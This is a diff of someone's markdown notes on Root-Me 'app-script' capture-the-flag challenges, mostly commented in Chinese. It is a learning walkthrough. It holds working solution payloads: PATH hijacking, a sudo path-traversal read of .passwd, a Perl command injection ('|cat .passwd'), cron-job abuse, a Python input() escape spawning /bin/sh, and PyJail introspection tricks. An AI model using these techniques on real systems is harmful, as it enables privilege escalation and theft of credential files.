@@ -1,4 +1,5 @@
-# 1.Bash - System 1
+# ROOTME
+## 1.Bash - System 1
 ````bash
 cd tmp
 mkdir tmp1
@@ -9,7 +10,7 @@ ls
 ~/ch11
 ````
 ---
-# 2.sudo - weak configuration 
+## 2.sudo - weak configuration 
 ````bash 
 sudo -l
 password app-script-ch1
@@ -25,7 +26,7 @@ sudo -u app-script-ch1-cracked
 cat /challenge/app-script/ch1/notes/../ch1craked/.passwd
 ````
 ---
-# 3.Bash - System 2
+## 3.Bash - System 2
 与第一题方式相同
 ````bash
 cp /bin/nano /tmp/tmp1/ls
@@ -53,13 +54,13 @@ export PATH=/tmp/pwnd1:$PATH
 ~/ch12
 ````
 ---
-# 4.Perl - Command injection
+## 4.Perl - Command injection
 ````bash
 ./setuid-wrapper
 |cat .passwd
 ````
 ---
-# 5.Bash - cron
+## 5.Bash - cron
 脚本注释表明，根据crontab规则，运行app-script-ch4的用户每分钟运行一次。
 除其他事项外，该脚本将执行文件夹cron.d /中指示的具有app-script-ch4-cracked权限的命令。
 ````bash
@@ -97,22 +98,22 @@ vim cron.d/script.sh                         //写入任务计划
 chmod o+rx cron.d/script.sh           //将该脚本的权限设置为其他用户可以读取和运行，因为该脚本需要在app-script-ch4-cracked用户的任务计划中执行，创建脚本后可能被瞬间删除，那样就需要重新创建，执行这两步操作后，等待不超过一分钟就可以生成/tmp/ch4/result.txt包含密码的结果。
 ````
 ---
-# 6.Python - input()
+## 6.Python - input()
 ````python
 __import__("os").execl("/bin/sh","sh")
 sys.stdout.write(open(".passwd").readline())  
 ```` 
 ---
-# 7.Python - pickle
+## 7.Python - pickle
 https://www.cnblogs.com/heycomputer/articles/10613850.html
 
 ---
 
-# 8.SSH - Agent Hijacking
+## 8.SSH - Agent Hijacking
 https://www.cnblogs.com/heycomputer/articles/10617379.html
 
 ---
-# 9.Python - PyJail 1
+## 9.Python - PyJail 1
 ````python
 print(exit.func_code.co_consts)
 ````
@@ -177,11 +178,11 @@ builtin	__doc__	documentation string
  	__self__	instance to which a method is bound, or None
 ````
 ---
-# 10.Bash/Awk - netstat parsing
+## 10.Bash/Awk - netstat parsing
 ---
-# 11.PHP - Jail
+## 11.PHP - Jail
 ---
-# 12.Python - PyJail 2
+## 12.Python - PyJail 2
 ````python
 print dir(getout)
 ['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name'] 
@@ -199,13 +200,13 @@ print list(getattr(getout,dir(getout)[-2]))[-7]
 print getout(getattr(getout,dir(getout)[-2])[list(getattr(getout,dir(getout)[-2]))[-7]])
 ````
 ---
-# 13.Python - Jail - Exec
+## 13.Python - Jail - Exec
 ---
-# 14.Javascript - Jail
+## 14.Javascript - Jail
 ---
-# 15.Python - Jail - Garbage collector
+## 15.Python - Jail - Garbage collector
 ---
-# 16.Bash - Restricted shells
+## 16.Bash - Restricted shells
 ---
 
 
